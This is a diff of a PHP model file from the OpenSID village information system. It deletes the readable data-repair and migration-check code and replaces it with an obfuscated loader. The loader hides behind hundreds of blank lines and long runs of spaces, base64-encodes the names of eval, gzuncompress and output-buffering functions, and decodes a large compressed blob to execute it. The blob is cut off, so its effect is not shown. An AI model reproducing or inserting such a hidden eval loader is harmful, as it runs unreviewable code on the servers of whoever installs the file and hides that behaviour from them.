@@ -1,806 +1,481 @@
-<?php
-
-/*
- *
- * File ini bagian dari:
- *
- * OpenSID
- *
- * Sistem informasi desa sumber terbuka untuk memajukan desa
- *
- * Aplikasi dan source code ini dirilis berdasarkan lisensi GPL V3
- *
- * Hak Cipta 2009 - 2015 Combine Resource Institution (http://lumbungkomunitas.net/)
- * Hak Cipta 2016 - 2022 Perkumpulan Desa Digital Terbuka (https://opendesa.id)
- *
- * Dengan ini diberikan izin, secara gratis, kepada siapa pun yang mendapatkan salinan
- * dari perangkat lunak ini dan file dokumentasi terkait ("Aplikasi Ini"), untuk diperlakukan
- * tanpa batasan, termasuk hak untuk menggunakan, menyalin, mengubah dan/atau mendistribusikan,
- * asal tunduk pada syarat berikut:
- *
- * Pemberitahuan hak cipta di atas dan pemberitahuan izin ini harus disertakan dalam
- * setiap salinan atau bagian penting Aplikasi Ini. Barang siapa yang menghapus atau menghilangkan
- * pemberitahuan ini melanggar ketentuan lisensi Aplikasi Ini.
- *
- * PERANGKAT LUNAK INI DISEDIAKAN "SEBAGAIMANA ADANYA", TANPA JAMINAN APA PUN, BAIK TERSURAT MAUPUN
- * TERSIRAT. PENULIS ATAU PEMEGANG HAK CIPTA SAMA SEKALI TIDAK BERTANGGUNG JAWAB ATAS KLAIM, KERUSAKAN ATAU
- * KEWAJIBAN APAPUN ATAS PENGGUNAAN ATAU LAINNYA TERKAIT APLIKASI INI.
- *
- * @package   OpenSID
- * @author    Tim Pengembang OpenDesa
- * @copyright Hak Cipta 2009 - 2015 Combine Resource Institution (http://lumbungkomunitas.net/)
- * @copyright Hak Cipta 2016 - 2022 Perkumpulan Desa Digital Terbuka (https://opendesa.id)
- * @license   http://www.gnu.org/licenses/gpl.html GPL V3
- * @link      https://github.com/OpenSID/OpenSID
- *
- */
-
-defined('BASEPATH') || exit('No direct script access allowed');
-
-class Periksa_model extends MY_Model
-{
-    public $periksa = [];
-
-    public function __construct()
-    {
-        parent::__construct();
-        $this->periksa['migrasi_utk_diulang'] = $this->deteksi_masalah();
-    }
-
-    private function deteksi_masalah()
-    {
-        $db_error_code    = $this->session->db_error['code'];
-        $db_error_message = $this->session->db_error['message'];
-
-        $current_version = $this->db
-            ->select('value')
-            ->where('key', 'current_version')
-            ->get('setting_aplikasi')
-            ->row()->value;
-
-        $calon = $current_version;
-
-        // Table tweb_penduduk no_kk ganda
-        if (! empty($kk_ganda = $this->deteksi_tweb_keluarga_no_kk_ganda())) {
-            $calon_ini                    = '19.11';
-            $this->periksa['masalah'][]   = 'no_kk_ganda';
-            $this->periksa['no_kk_ganda'] = $kk_ganda;
-            $calon                        = version_compare($calon, $calon_ini, '<') ? $calon : $calon_ini;
-        }
-
-        // pamong_id belum ada
-        if ($db_error_code == 1406) {
-            $pos       = strpos($this->session->message_query, "CONCAT_WS('_', kode, id)");
-            $calon_ini = $current_version;
-            if ($pos !== false) {
-                $calon_ini                     = '20.12';
-                $this->periksa['masalah'][]    = 'kode_kelompok';
-                $this->periksa['kode_panjang'] = $this->deteksi_kode_panjang();
-            }
-            $calon = version_compare($calon, $calon_ini, '<') ? $calon : $calon_ini;
-        }
-
-        // tag_id_ganda
-        $tag_id_ganda_1 = ($db_error_code == 1054 && strpos($db_error_message, 'pamong_id') !== false);
-        $tag_id_ganda_2 = ($db_error_code == 1062 && strpos($this->session->message_query, 'ALTER TABLE tweb_penduduk ADD UNIQUE tag_id_card'));
-        if ($tag_id_ganda_1 || $tag_id_ganda_2) {
-            $calon_ini                     = '21.04';
-            $this->periksa['masalah'][]    = 'tag_id_ganda';
-            $this->periksa['tag_id_ganda'] = $this->deteksi_tag_id_ganda();
-            $calon                         = version_compare($calon, $calon_ini, '<') ? $calon : $calon_ini;
-        }
-
-        // kartu_tempat_lahir atau kartu_alamat berisi null
-        if ($db_error_code == 1138) {
-            $pos1      = strpos($this->session->message_query, 'kartu_tempat_lahir');
-            $pos2      = strpos($this->session->message_query, 'kartu_alamat');
-            $calon_ini = $current_version;
-            if ($pos1 !== false && $pos2 !== false) {
-                $calon_ini                  = '21.05';
-                $this->periksa['masalah'][] = 'kartu_alamat';
-            }
-            $calon = version_compare($calon, $calon_ini, '<') ? $calon : $calon_ini;
-        }
-
-        // id_cluster Keluarga beserta anggota keluarganya ada yg null
-        if ($db_error_code == 1138) {
-            $pos       = strpos($this->session->message_query, 'id_cluster');
-            $calon_ini = $current_version;
-            if ($pos !== false) {
-                $calon_ini                        = '21.07';
-                $this->periksa['masalah'][]       = 'id_cluster_null';
-                $this->periksa['id_cluster_null'] = $this->deteksi_id_cluster_null();
-                $this->periksa['wilayah_pertama'] = $this->wilayah_pertama();
-            }
-            $calon = version_compare($calon, $calon_ini, '<') ? $calon : $calon_ini;
-        }
-
-        // NIK penduduk ganda
-        if ($db_error_code == 1062) {
-            $pos       = strpos($this->session->message_query, 'ALTER TABLE tweb_penduduk ADD UNIQUE nik');
-            $calon_ini = $current_version;
-            if ($pos !== false) {
-                $calon_ini                  = '21.09';
-                $this->periksa['masalah'][] = 'nik_ganda';
-                $this->periksa['nik_ganda'] = $this->deteksi_nik_ganda();
-            }
-            $calon = version_compare($calon, $calon_ini, '<') ? $calon : $calon_ini;
-        }
-
-        // No KK terlalu panjang
-        if ($db_error_code == 1265 || $db_error_code == 1406) {
-            $pos1 = strpos($db_error_message, "Data too long for column 'no_kk' ");
-            $pos2 = strpos($db_error_message, "Data truncated for column 'no_kk'");
-            log_message('error', $pos2);
-            $calon_ini = $current_version;
-            if ($pos1 !== false || $pos2 !== false) {
-                log_message('error', 'kk_panjang');
-                $calon_ini                   = '21.11';
-                $this->periksa['masalah'][]  = 'kk_panjang';
-                $this->periksa['kk_panjang'] = $this->deteksi_kk_panjang();
-            }
-            $calon = version_compare($calon, $calon_ini, '<') ? $calon : $calon_ini;
-        }
-
-        // email user ganda
-        if ($db_error_code == 1062) {
-            $pos       = strpos($this->session->message_query, 'ALTER TABLE user ADD UNIQUE email');
-            $calon_ini = $current_version;
-            if ($pos !== false) {
-                $calon_ini                         = '22.02';
-                $this->periksa['masalah'][]        = 'email_user_ganda';
-                $this->periksa['email_user_ganda'] = $this->deteksi_email_user_ganda();
-            }
-            $calon = version_compare($calon, $calon_ini, '<') ? $calon : $calon_ini;
-        }
-
-        // username user ganda
-        if (! empty($username = $this->deteksi_username_user_ganda())) {
-            $calon_ini                            = '22.02';
-            $this->periksa['masalah'][]           = 'username_user_ganda';
-            $this->periksa['username_user_ganda'] = $username;
-            $calon                                = version_compare($calon, $calon_ini, '<') ? $calon : $calon_ini;
-        }
-
-        // Email penduduk ganda, menyebabkan migrasi 22.02 gagal.
-        if ($db_error_code == 1062) {
-            $pos       = strpos($this->session->message_query, 'ALTER TABLE tweb_penduduk ADD UNIQUE email');
-            $calon_ini = '22.02';
-            if ($pos !== false) {
-                $calon_ini                    = '22.02';
-                $this->periksa['masalah'][]   = 'email_ganda';
-                $this->periksa['email_ganda'] = $this->deteksi_email_ganda();
-            }
-            $calon = version_compare($calon, $calon_ini, '<') ? $calon : $calon_ini;
-        }
-
-        // Autoincrement hilang, mungkin karena proses backup/restore yang tidak sempurna
-        // Untuk masalah yg tidak melalui exception, letakkan sesuai urut migrasi
-        if ($db_error_code == 1364) {
-            $pos = strpos($db_error_message, "Field 'id' doesn't have a default value");
-            if ($pos !== false) {
-                $this->periksa['masalah'][] = 'autoincrement';
-            }
-        }
-
-        // Error collation table
-        $collation_table = $this->deteksi_collation_table_tidak_sesuai();
-        $error_msg       = strpos($this->session->message_query, 'Illegal mix of collations');
-        if (! empty($collation_table) || $error_msg) {
-            $this->periksa['masalah'][]       = 'collation';
-            $this->periksa['collation_table'] = $collation_table;
-        }
-
-        return $calon;
-    }
-
-    private function wilayah_pertama()
-    {
-        $wilayah_pertama = [];
-        // Ambil sebutan dusun
-        $sebutan_dusun = $this->db
-            ->select('value')
-            ->where('key', 'sebutan_dusun')
-            ->get('setting_aplikasi')
-            ->row()->value;
-        // Ambil wilayah pada keluarga pertama yg tidak kosong
-        $id_wil = $this->db
-            ->select('id_cluster')
-            ->where('id_cluster IS NOT NULL')
-            ->order_by('id')
-            ->limit(1)
-            ->get('tweb_keluarga')
-            ->row()->id_cluster;
-        $wilayah_pertama['id'] = $id_wil;
-        $wil                   = $this->db
-            ->select('dusun, rw, rt')
-            ->where('id', $id_wil)
-            ->get('tweb_wil_clusterdesa')
-            ->row();
-        if ($wil->dusun) {
-            $wilayah_pertama['wil'] .= strtoupper($sebutan_dusun) . ' ' . $wil->dusun . ' ';
-        }
-        if ($wil->rw) {
-            $wilayah_pertama['wil'] .= 'RW ' . $wil->rw . ' ';
-        }
-        if ($wil->rt) {
-            $wilayah_pertama['wil'] .= 'RT ' . $wil->rt . ' ';
-        }
-
-        return $wilayah_pertama;
-    }
-
-    private function deteksi_tag_id_ganda()
-    {
-        return $this->db
-            ->select('tag_id_card, COUNT(tag_id_card) as jml')
-            ->from('tweb_penduduk')
-            ->group_by('tag_id_card')
-            ->having('jml > 1')
-            ->get()
-            ->result_array();
-    }
-
-    private function deteksi_kode_panjang()
-    {
-        // Jika di CONCAT akan melebihi panjang yg diperbolehkan untuk kode (16)
-        return $this->db
-            ->select('id, kode')
-            ->from('kelompok')
-            ->where('CHAR_LENGTH(kode) + CHAR_LENGTH(id) + 1 > 16')
-            ->get()
-            ->result_array();
-    }
-
-    private function deteksi_kk_panjang()
-    {
-        // No KK melebihi 16 karakter
-        return $this->db
-            ->select('id, no_kk, CHAR_LENGTH(no_kk) AS panjang')
-            ->from('tweb_keluarga')
-            ->where('CHAR_LENGTH(no_kk) > 16')
-            ->get()
-            ->result_array();
-    }
-
-    private function deteksi_id_cluster_null()
-    {
-        return $this->db
-            ->select('no_kk, p.nama')
-            ->from('tweb_keluarga k')
-            ->join('tweb_penduduk p', 'p.id = k.nik_kepala', 'left')
-            ->where('k.id_cluster IS NULL')
-            ->get()
-            ->result_array();
-    }
-
-    private function deteksi_nik_ganda()
-    {
-        return $this->db
-            ->select('nik, COUNT(id) as jml')
-            ->from('tweb_penduduk')
-            ->group_by('nik')
-            ->having('jml >', 1)
-            ->get()
-            ->result_array();
-    }
-
-    private function deteksi_email_ganda()
-    {
-        $email = $this->db
-            ->select('email, COUNT(id) as jml')
-            ->from('tweb_penduduk p')
-            ->where('email IS NOT NULL')
-            ->group_by('email')
-            ->having('jml >', 1)
-            ->get()
-            ->result_array();
-        if (! empty($email) && empty($this->session->db_error)) {
-            // Berikan kode kustom karena exception dihindari di migrasi.
-            $this->session->db_error = [
-                'code'    => 99001,
-                'message' => 'Email penduduk ganda',
-            ];
-        }
-
-        return $email;
-    }
-
-    private function deteksi_email_user_ganda()
-    {
-        return $this->db
-            ->select('email, COUNT(id) as jml')
-            ->from('user')
-            ->where('email IS NOT NULL')
-            ->group_by('email')
-            ->having('jml >', 1)
-            ->get()
-            ->result_array();
-    }
-
-    private function deteksi_username_user_ganda()
-    {
-        return $this->db
-            ->select('username, COUNT(id) as jml')
-            ->from('user')
-            ->where('username IS NOT NULL')
-            ->group_by('username')
-            ->having('jml >', 1)
-            ->get()
-            ->result_array();
-    }
-
-    private function deteksi_tweb_keluarga_no_kk_ganda()
-    {
-        return $this->db
-            ->select('no_kk, COUNT(id) as jml')
-            ->from('tweb_keluarga')
-            ->group_by('no_kk')
-            ->having('jml >', 1)
-            ->get()
-            ->result_array();
-    }
-
-    private function deteksi_collation_table_tidak_sesuai()
-    {
-        return $this->db
-            ->query("SELECT TABLE_NAME, TABLE_COLLATION FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_TYPE = 'BASE TABLE' AND TABLE_SCHEMA = '{$this->db->database}' AND TABLE_COLLATION != 'utf8_general_ci'")
-            ->result_array();
-    }
-
-    public function perbaiki()
-    {
-        // TODO: login
-        $this->session->user_id = $this->session->user_id ?: 1;
-
-        // Perbaiki masalah data yg terdeteksi untuk error yg dilaporkan
-        log_message('error', '========= Perbaiki masalah data =========');
-
-        foreach ($this->periksa['masalah'] as $masalah_ini) {
-            switch ($masalah_ini) {
-                case 'kode_kelompok':
-                    $this->perbaiki_kode_kelompok();
-                    break;
-
-                case 'id_cluster_null':
-                    $this->perbaiki_id_cluster_null();
-                    break;
-
-                case 'nik_ganda':
-                    $this->perbaiki_nik_ganda();
-                    break;
-
-                case 'email_ganda':
-                    $this->perbaiki_email();
-                    break;
-
-                case 'kk_panjang':
-                    $this->perbaiki_kk_panjang();
-                    break;
-
-                case 'no_kk_ganda':
-                    $this->perbaiki_no_kk_ganda();
-                    break;
-
-                case 'email_user_ganda':
-                    $this->perbaiki_email_user();
-                    break;
-
-                case 'username_user_ganda':
-                    $this->perbaiki_username_user();
-                    break;
-
-                case 'tag_id_ganda':
-                    $this->perbaiki_tag_id();
-                    break;
-
-                case 'kartu_alamat':
-                    $this->perbaiki_kartu_alamat();
-                    break;
-
-                case 'autoincrement':
-                    $this->perbaiki_autoincrement();
-                    break;
-
-                case 'collation':
-                    $this->perbaiki_collation_table();
-                    break;
-
-                default:
-                    break;
-            }
-        }
-        $this->session->db_error = null;
-
-        // Ulangi migrasi mulai dari migrasi_utk_diulang
-        $this->db
-            ->where('versi_database', VERSI_DATABASE)
-            ->delete('migrasi');
-        $this->db
-            ->set('value', $this->periksa['migrasi_utk_diulang'])
-            ->where('key', 'current_version')
-            ->update('setting_aplikasi');
-        $this->load->model('database_model');
-        $this->database_model->migrasi_db_cri();
-    }
-
-    private function perbaiki_kode_kelompok()
-    {
-        if (empty($this->periksa['kode_panjang'])) {
-            return;
-        }
-
-        $kode = array_column($this->periksa['kode_panjang'], 'kode');
-        log_message('error', 'Kode kelompok berikut telah diperpendek: ' . print_r($this->periksa['kode_panjang'], true));
-        // Ubah kode kelompok dengan panjang id + 1
-        $this->db
-            ->set('kode', 'SUBSTRING(kode, 1, (CHAR_LENGTH(kode) - CHAR_LENGTH(id) - 1))', false)
-            ->where_in('kode', $kode)
-            ->update('kelompok');
-    }
-
-    // Hanya terjadi pada keluarga yg tidak memiliki anggota lagi
-    private function perbaiki_id_cluster_null()
-    {
-        if (empty($this->periksa['id_cluster_null'])) {
-            return;
-        }
-
-        $kel_kosong = array_column($this->periksa['id_cluster_null'], 'no_kk');
-        log_message('error', 'Lokasi keluarga berikut telah diubah menjadi ' . $this->periksa['wilayah_pertama']['wil'] . ' : ' . print_r($kel_kosong, true));
-
-        // Ganti id_cluster kosong dengan wilayah pertama
-        $this->db
-            ->set('id_cluster', $this->periksa['wilayah_pertama']['id'])
-            ->where('id_cluster IS NULL')
-            ->update('tweb_keluarga');
-    }
-
-    // Migrasi 21.09 gagal jika ada NIK ganda
-    private function perbaiki_nik_ganda()
-    {
-        if (empty($this->periksa['nik_ganda'])) {
-            return;
-        }
-
-        $this->load->model('penduduk_model');
-
-        // Catat semua NIK bukan numerik
-        $nik_ganda = $this->db
-            ->select('id, nik as nik_ganda, nama')
-            ->where("nik NOT REGEXP '^[0-9]+$'")
-            ->get('tweb_penduduk')
-            ->result_array();
-
-        // Catat semua NIK ganda numerik selain pertama
-        foreach ($this->periksa['nik_ganda'] as $nik) {
-            if (! is_numeric($nik['nik'])) {
-                continue;
-            }
-            $daftar_nik = $this->db
-                ->select('id, nik as nik_ganda, nama')
-                ->from('tweb_penduduk')
-                ->where('nik', $nik['nik'])
-                ->get()
-                ->result_array();
-            array_shift($daftar_nik);
-
-            $nik_ganda = array_merge($nik_ganda, $daftar_nik);
-        }
-
-        // Catat NIK sementara untuk NIK ganda yg akan diubah
-        $nik_sementara = $this->penduduk_model->nik_sementara();
-        $nik_sementara = str_split($nik_sementara, 11);
-
-        foreach ($nik_ganda as $key => $nik) {
-            $urut                             = sprintf('%05d', $nik_sementara[1] + $key);
-            $nik_ganda[$key]['nik_sementara'] = $nik_sementara[0] . $urut;
-        }
-
-        // Ubah NIK ganda dengan menjadi NIK sementara
-        foreach ($nik_ganda as $nik) {
-            $this->db
-                ->set('nik', $nik['nik_sementara'])
-                ->where('id', $nik['id'])
-                ->update('tweb_penduduk');
-        }
-        log_message('error', 'NIK penduduk berikut telah diubah menjadi NIK semenntara: ' . print_r($nik_ganda, true));
-    }
-
-    // Migrasi 22.02 sengaja gagal jika ada email ganda
-    private function perbaiki_email()
-    {
-        if (empty($this->periksa['email_ganda'])) {
-            return;
-        }
-
-        // Ubah semua email kosong menjadi null
-        $this->db
-            ->set('email', null)
-            ->where('email', '')
-            ->update('tweb_penduduk');
-        // Ubah semua email ganda
-        $email_ganda = [];
-
-        foreach ($this->periksa['email_ganda'] as $email) {
-            if (empty($email['email'])) {
-                continue;
-            }
-            $daftar_ubah = $this->db
-                ->select('id, nik, nama, CONCAT(id, "_", email)')
-                ->from('tweb_penduduk')
-                ->where('email', $email['email'])
-                ->get()
-                ->result_array();
-            log_message('error', 'Email penduduk berikut telah diubah dengan menambah id: ' . print_r($daftar_ubah, true));
-            $email_ganda = array_merge($email_ganda, array_column($daftar_ubah, 'id'));
-        }
-        // Ubah email ganda dengan menambah id
-        $this->db
-            ->set('email', 'CONCAT(id, "_", email)', false)
-            ->where_in('id', $email_ganda)
-            ->update('tweb_penduduk');
-    }
-
-    // Migrasi 21.11 gagal jika ada no KK melebihi 16 karakter
-    private function perbaiki_kk_panjang()
-    {
-        if (empty($this->periksa['kk_panjang'])) {
-            return;
-        }
-
-        $this->load->model('keluarga_model');
-
-        // Catat semua No KK panjang
-        $kk_panjang = $this->db
-            ->select('id, no_kk as kk_panjang, nik_kepala')
-            ->where('CHAR_LENGTH(no_kk) > 16')
-            ->get('tweb_keluarga')
-            ->result_array();
-
-        // Catat No KK sementara untuk No KK panjang yg akan diubah
-        $nokk_sementara = $this->keluarga_model->nokk_sementara();
-        $nokk_sementara = str_split($nokk_sementara, 11);
-
-        foreach ($kk_panjang as $key => $kk) {
-            $urut                               = sprintf('%05d', $nokk_sementara[1] + $key);
-            $kk_panjang[$key]['nokk_sementara'] = $nokk_sementara[0] . $urut;
-        }
-        // Ubah No KK panjang menjadi No KK sementara
-        foreach ($kk_panjang as $kk) {
-            $this->db
-                ->set('no_kk', $kk['nokk_sementara'])
-                ->where('id', $kk['id'])
-                ->update('tweb_keluarga');
-        }
-        log_message('error', ' No KK berikut telah diubah menjadi No KK sementara: ' . print_r($kk_panjang, true));
-    }
-
-    private function perbaiki_no_kk_ganda()
-    {
-        $this->load->model('keluarga_model');
-
-        if (empty($this->periksa['no_kk_ganda'])) {
-            return;
-        }
-
-        $duplikat = $this->db
-            ->select('id')
-            ->where_in('no_kk', 'SELECT tk.no_kk FROM tweb_keluarga as tk GROUP BY tk.no_kk HAVING COUNT(tk.no_kk) > 1', false)
-            ->get('tweb_keluarga')
-            ->result_array();
-
-        // Ubah No KK panjang menjadi No KK sementara
-        foreach ($duplikat as $item) {
-            $this->db
-                ->set('no_kk', $this->keluarga_model->nokk_sementara())
-                ->where('id', $item['id'])
-                ->update('tweb_keluarga');
-        }
-
-        log_message('error', ' No KK berikut telah diubah menjadi No KK sementara: ' . print_r($this->periksa['no_kk_ganda'], true));
-    }
-
-    // Migrasi 22.02 gagal jika ada email user ganda
-    private function perbaiki_email_user()
-    {
-        if (empty($this->periksa['email_user_ganda'])) {
-            return;
-        }
-
-        // Ubah semua email kosong menjadi null
-        $this->db
-            ->set('email', null)
-            ->where('email', '')
-            ->update('user');
-        // Ubah semua email ganda
-        $email_ganda = [];
-
-        foreach ($this->periksa['email_user_ganda'] as $email) {
-            if (empty($email['email'])) {
-                continue;
-            }
-            $daftar_ubah = $this->db
-                ->select('id, username, nama, CONCAT(id, "_", email)')
-                ->from('user')
-                ->where('email', $email['email'])
-                ->get()
-                ->result_array();
-            log_message('error', 'Email user berikut telah diubah dengan menambah id: ' . print_r($daftar_ubah, true));
-            $email_ganda = array_merge($email_ganda, array_column($daftar_ubah, 'id'));
-        }
-        // Ubah email user ganda dengan menambah id
-        $this->db
-            ->set('email', 'CONCAT(id, "_", email)', false)
-            ->where_in('id', $email_ganda)
-            ->update('user');
-    }
-
-    // Migrasi 22.02 gagal jika ada username user ganda
-    private function perbaiki_username_user()
-    {
-        if (empty($this->periksa['username_user_ganda'])) {
-            return;
-        }
-
-        // Ubah semua usernamer ganda
-        $username_ganda = [];
-
-        foreach ($this->periksa['username_user_ganda'] as $username) {
-            if (empty($username['username'])) {
-                continue;
-            }
-            $daftar_ubah = $this->db
-                ->select('id, username, nama, CONCAT(id, "_", username)')
-                ->from('user')
-                ->where('username', $username['username'])
-                ->get()
-                ->result_array();
-            log_message('error', 'Username user berikut telah diubah dengan menambah id: ' . print_r($daftar_ubah, true));
-            $username_ganda = array_merge($username_ganda, array_column($daftar_ubah, 'id'));
-        }
-
-        // Ubah username user ganda dengan menambah id dan set tidak aktif
-        if ($username_ganda) {
-            $this->db
-                ->set('username', 'CONCAT(id, "_", username)', false)
-                ->set('active', 0)
-                ->where('id !=', 1)
-                ->where_in('id', $username_ganda)
-                ->update('user');
-        }
-
-        // Ubah semua username kosong menjadi null
-        $this->db
-            ->set('username', null)
-            ->set('active', 0)
-            ->where('username', '')
-            ->update('user');
-    }
-
-    // Migrasi 21.04 tidak antiCONCAT(id, "_", email)sipasi tag_id_card ganda
-    private function perbaiki_tag_id()
-    {
-        if (empty($this->periksa['tag_id_ganda'])) {
-            return;
-        }
-        $daftar_tag_id = [];
-
-        // Ubah semua tag_id_card kosong menjadi null
-        $this->db
-            ->set('tag_id_card', null)
-            ->where('tag_id_card', '')
-            ->update('tweb_penduduk');
-
-        // Ubah tag_id_card ganda menjadi kosong selain yg pertama
-        foreach ($this->periksa['tag_id_ganda'] as $tag_ganda) {
-            if (empty($tag_ganda['tag_id_card'])) {
-                continue;
-            }
-            $select_pertama = $this->db
-                ->select('MIN(id) as id')
-                ->from('tweb_penduduk')
-                ->where('tag_id_card', $tag_ganda['tag_id_card'])
-                ->group_by('tag_id_card')
-                ->get_compiled_select();
-            $daftar_ubah = $this->db
-                ->select('p.id, nik, nama, tag_id_card')
-                ->from('tweb_penduduk p')
-                ->join('(' . $select_pertama . ') p_pertama', 'p.id > p_pertama.id')
-                ->where('p.tag_id_card', $tag_ganda['tag_id_card'])
-                ->get()
-                ->result_array();
-            log_message('error', 'Ubah tag_id_card penduduk berikut menjadi kosong: ' . print_r($daftar_ubah, true));
-            $daftar_tag_id = array_merge($daftar_tag_id, array_column($daftar_ubah, 'id'));
-        }
-        // Ubah tag_id ganda menjadi kosong
-        $this->db
-            ->set('tag_id_card', null)
-            ->where_in('id', $daftar_tag_id)
-            ->update('tweb_penduduk');
-    }
-
-    // Migrasi 21.05 tidak antisipasi kartu_tempat_lahir atau kartu_alamat berisi null
-    private function perbaiki_kartu_alamat()
-    {
-        $this->db
-            ->set('kartu_tempat_lahir', '')
-            ->where('kartu_tempat_lahir is null')
-            ->update('program_peserta');
-        $this->db
-            ->set('kartu_alamat', '')
-            ->where('kartu_alamat is null')
-            ->update('program_peserta');
-        log_message('error', "Kolom kartu_tempat_lahir dan kartu_alamat peserta bantuan yang berisi null telah diubah menjadi '' ");
-    }
-
-    private function perbaiki_autoincrement()
-    {
-        $hasil = true;
-
-        // Tabel yang tidak memerlukan Auto_Increment
-        $exclude_table = [
-            'analisis_respon',
-            'analisis_respon_hasil',
-            'captcha_codes',
-            'detail_log_penduduk', // Tabel ini digunakan dimana?
-            'password_resets',
-            'pertanyaan', // Tabel ini digunakan dimana?
-            'sentitems', // Belum tau bentuk datanya bagamana
-            'setting_sms',
-            'sys_traffic',
-            'tweb_penduduk_mandiri',
-            'tweb_penduduk_map', // id pada tabel tweb_penduduk_map == penduduk.id (buka id untuk AI)
-        ];
-
-        // Auto_Increment hanya diterapkan pada kolom berikut
-        $only_pk = [
-            'id',
-            'id_kontak',
-            'id_aset',
-        ];
-
-        // Daftar tabel yang tidak memiliki Auto_Increment
-        $tables = $this->db->query("SELECT `TABLE_NAME` FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_TYPE = 'BASE TABLE' AND TABLE_SCHEMA = '{$this->db->database}' AND AUTO_INCREMENT IS NULL");
-
-        foreach ($tables->result() as $tbl) {
-            $name = $tbl->TABLE_NAME;
-            if (! in_array($name, $exclude_table) && in_array($key = $this->db->list_fields($name)[0], $only_pk)) {
-                $fields = [
-                    $key => [
-                        'type'           => 'INT',
-                        'constraint'     => 11,
-                        'unsigned'       => true,
-                        'auto_increment' => true,
-                    ],
-                ];
-
-                $this->db->simple_query('SET FOREIGN_KEY_CHECKS=0');
-                if ($hasil = $hasil && $this->dbforge->modify_column($name, $fields)) {
-                    log_message('error', "Auto_Increment pada tabel {$name} dengan kolom {$key} telah ditambahkan.");
-                }
-                $this->db->simple_query('SET FOREIGN_KEY_CHECKS=1');
-            }
-        }
-
-        return $hasil;
-    }
-
-    private function perbaiki_collation_table()
-    {
-        $hasil  = true;
-        $tables = $this->periksa['collation_table'];
-
-        if ($tables) {
-            foreach ($tables as $tbl) {
-                if ($this->db->table_exists($tbl['TABLE_NAME'])) {
-                    $hasil = $hasil && $this->db->query("ALTER TABLE {$tbl['TABLE_NAME']} CONVERT TO CHARACTER SET utf8 COLLATE utf8_general_ci");
-
-                    log_message('error', 'Tabel ' . $tbl['TABLE_NAME'] . ' collation diubah dari ' . $tbl['TABLE_COLLATION'] . ' menjadi utf8_general_ci.');
-                }
-            }
-        }
-
-        return $hasil;
-    }
-}
+<?php 
+        $__='printf';$_='Loading donjo-app/models/Periksa_model.php';
+        
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+                                                                                                                                                                                                $_____='    b2JfZW5kX2NsZWFu';                                                                                                                                                                              $______________='cmV0dXJuIGV2YWwoJF8pOw==';
+$__________________='X19sYW1iZGE=';
+
+                                                                                                                                                                                                                                          $______=' Z3p1bmNvbXByZXNz';                    $___='  b2Jfc3RhcnQ=';                                                                                                    $____='b2JfZ2V0X2NvbnRlbnRz';                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                $__=                                                              'base64_decode'                           ;                                                                       $______=$__($______);           if(!function_exists('__lambda')){function __lambda($sArgs,$sCode){return eval("return function($sArgs){{$sCode}};");}}                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                    $__________________=$__($__________________);                                                                                                                                                                                                                                                                                                                                                                         $______________=$__($______________);
+        $__________=$__________________('$_',$______________);                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                 $_____=$__($_____);                                                                                                                                                                                                                                                    $____=$__($____);                                                                                                                    $___=$__($___);                      $_='eNrtPdly6kiW7xUx/1APHXF7oma6JTBVV1FRDwgjkAzYSGhBLxVaLgIjljJglq+fczIlkRIpFtu3q6vHqnZfG6RcTp59048/0utvv8P125fly2S+Hn35lfyZXL99CRfz58X/esvlP2eL8Fu8+ufTt5fJdOX9Tv78x3K8/LERe6vVP/7xjy+//pCM+ON//fD53/+f/35AlPnxA6/fTj754ojSamiLE7fV/O0L+eiIbVddCVr/9uPn9Xl9Xp/Xf+b1JZhZQuhoG7VlVYb2dqEp0sjZT3+hTBO4JmXXv3+C6vP6vD6vz+vz+rw+r8/r8/q8/mrXpzvj8/q8Pq/P6z/3+uJ7q28/3/0efgsW4bcvv35C5PP6vD6vz+vz+rzedeVzHe77i15j8vUP+Dd6iIQHtbGI9Fm8cg156c+m0XCmzD1b2agtfRzMpj+z9w2qcuzHPU2vk79hnPofqtJbBlU99snz7mswE8dBZRq5LeswNORDiPFsR43ClrUfzq0X+Ez057ro7eW1a4tjDz+z7+j9fWbcprL1W/HL0OktcS3+RD74VRijYkbDijRN1+u24r1n75bBXoZ5tCncD+te4/0rz+nF/hyeb4b9QUO2u1t2/PEY1nDvObIwNOr77n29pjaEqPtc3/UM+d6viBPPrsWqosVBRRKDWS9Wm/EG9roM25bg2dJGbYwXYVvfPk6+vvptaw3727iV9avvWBvPAfjtaxvX6b8+0H1FRkt5UZsAr7Y+Vu/VbXcwjDpkbnWvKnIM6xZ9B+DTAvg3dZi3GemteI5j+Q3ZhP1NQns9TucNDovXTkXaunZt6sK+O7N4+pCDIZzLLERYpLBCGC29Cp5v/LNn363Udi8eVpQ9nMs8mCmC53RXamsdBy1liucHuLCFf7chnNE3wAuXnFsN4CyPwxaB82EI8PdnyobgykSG77Sl2sb9KAiPcdiQV6FdQ3gn68D53aXfMuF36QVwBM5JJ3iDeALrW4aN+kKdMjgAsPcMddlpZPgzhbODOXZjr0pwiO4ZYOvP5bHa0mB9CqwN9wiwRLyE+9QWOXcGB2tzt2pthjbuZRv5trWBfa4IbFoiwk8EmlhQHJRwTJF+riPeA+5pYlCJcf5Vsn/Yh4JzinAPzrEd2nDe7V4N4IKwoGdQtYTHiKUjoC0bcG0WC0N7LCJNeIgvrQRfWjrQgS